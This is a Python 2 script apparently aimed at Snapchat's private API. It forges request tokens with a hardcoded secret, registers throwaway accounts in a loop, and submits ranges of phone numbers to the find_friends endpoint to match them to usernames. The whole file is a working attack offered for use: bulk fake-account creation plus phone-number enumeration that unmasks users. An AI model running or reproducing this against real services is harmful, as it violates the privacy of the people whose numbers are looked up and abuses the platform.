#!/usr/bin/env python2
# python2 find_friends.py $username $password < numbers.txt > results.txt
import requests
import hashlib
import json
import sys
import random

def request_token(auth_token, timestamp):
    secret = "iEk21fuwZApXlz93750dmW22pw389dPwOk"
    pattern = "0001110111101110001111010101111011010001001110011000110001000110"
    first = hashlib.sha256(secret + auth_token).hexdigest()
    second = hashlib.sha256(str(timestamp) + secret).hexdigest()
    bits = [first[i] if c == "0" else second[i] for i, c in enumerate(pattern)]
    return "".join(bits)

def makeAccount():
    base = "https://feelinsonice.appspot.com"
    username = "xblob2" + str(random.randint(10000, 999999))
    password = 'Obn0xious'
    email = 'rewfew%d@freedumbs.net' % (random.randint(10000, 9999999))
    reg = requests.post(base + "/bq/register", data={
        "req_token": "9301c956749167186ee713e4f3a3d90446e84d8d19a4ca8ea9b4b314d1c51b7b",
        "timestamp": 1373209025,
        "email": email,
        "password": password,
        "age": 19,
        "birthday": "1994-11-27",
    }, headers={"User-agent": None})
    if not reg.json()["logged"]:
        return { 'username': 'FAIL', 'password': 'FAIL' }
    nam = requests.post(base + "/ph/registeru", data={
        "req_token": "9301c956749167186ee713e4f3a3d90446e84d8d19a4ca8ea9b4b314d1c51b7b",
         "timestamp": 1373209025,
         "email": email,
         "username": username
    }, headers={"User-agent": None})
    if not nam.json()["logged"]:
        return { 'username': 'FAIL', 'password': 'FAIL' }
    return { 'username': username, 'password': password }


base = "https://feelinsonice.appspot.com"

for i in range(10, 100):
    numbers = sys.argv[1]
    account = makeAccount()
    if account['username'] == 'FAIL':
        print(account['username'], account['password'])
        continue
    username = account['username']
    password = account['password']
    numbers = numbers + str(i)
    r = requests.post(base + "/bq/login", data={
        # These are hardcoded, just because it's easy.
        "req_token": "9301c956749167186ee713e4f3a3d90446e84d8d19a4ca8ea9b4b314d1c51b7b",
        "timestamp": 1373209025,
        "username": username,
        "password": password
    }, headers={"User-agent": None})
    auth_token, username = r.json()["auth_token"], r.json()["username"]
    static = {"req_token": request_token(auth_token, 1373209025), "countryCode": "US", "timestamp": 1373209025, "username": username}
    n = json.dumps({numbers: "J. R. Hacker"})
    r = requests.post(base + "/ph/find_friends", data=dict(static, numbers=n), headers={"User-agent": None}).json()
    if len(r["results"]) < 1:
        continue
    sys.stdout.write("{0} -> {1}\n".format(numbers, r["results"][0]["name"]))
    sys.stdout.flush()